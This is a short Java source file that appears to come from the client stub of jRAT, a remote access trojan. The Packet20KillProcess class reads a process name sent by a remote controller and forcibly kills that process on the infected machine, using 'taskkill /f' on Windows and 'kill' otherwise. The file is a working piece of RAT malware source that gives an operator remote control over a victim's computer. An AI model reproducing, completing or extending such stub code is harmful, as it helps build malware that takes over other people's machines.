package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;

import com.redpois0n.oslib.OperatingSystem;

public class Packet20KillProcess extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String process = Connection.readLine();

		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(new String[] { "taskkill", "/f", "/im", process });
			} else {
				Runtime.getRuntime().exec("kill " + process);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
